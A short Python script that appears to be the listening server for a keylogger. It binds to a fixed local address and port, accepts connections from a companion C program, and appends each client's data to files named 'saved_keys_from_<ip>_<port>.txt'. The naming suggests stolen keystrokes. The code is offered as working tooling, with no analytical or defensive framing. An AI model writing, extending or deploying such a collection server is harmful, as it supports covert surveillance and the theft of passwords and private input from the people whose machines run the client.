import sys
import socket
import selectors
import types

sel = selectors.DefaultSelector()

# Use fixed IP and port to match your C code
HOST = '192.168.1.6'   
PORT = 5678        # match SERVER_PORT in C

lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lsock.bind((HOST, PORT))
lsock.listen()
print(f'Listening on {(HOST, PORT)}')
lsock.setblocking(False)
sel.register(lsock, selectors.EVENT_READ, data=None)

def accept_wrapper(sock):
    conn, addr = sock.accept()
    print(f'Accepted connection from {addr}')
    conn.setblocking(False)

    filename = f'saved_keys_from_{addr[0]}_{addr[1]}.txt'
    file_handle = open(filename, 'ab')  # Append bytes

    data = types.SimpleNamespace(
        addr=addr,
        inb=b'',
        outb=b'',
        file=file_handle
    )
    sel.register(conn, selectors.EVENT_READ, data=data)  # Only read events needed

def service_connection(key, mask):
    sock = key.fileobj
    data = key.data
    try:
        if mask & selectors.EVENT_READ:
            recv_data = sock.recv(1024)
            if recv_data:
                data.file.write(recv_data)
                data.file.flush()
            else:
                # Connection closed by client
                print(f'Closing connection to {data.addr}')
                sel.unregister(sock)
                sock.close()
                data.file.close()
    except Exception as e:
        print(f"Error with {data.addr}: {e}")
        sel.unregister(sock)
        sock.close()
        data.file.close()

try:
    while True:
        events = sel.select(timeout=None)
        for key, mask in events:
            if key.data is None:
                accept_wrapper(key.fileobj)
            else:
                service_connection(key, mask)
except KeyboardInterrupt:
    print('Caught keyboard interrupt, exiting')
finally:
    sel.close()

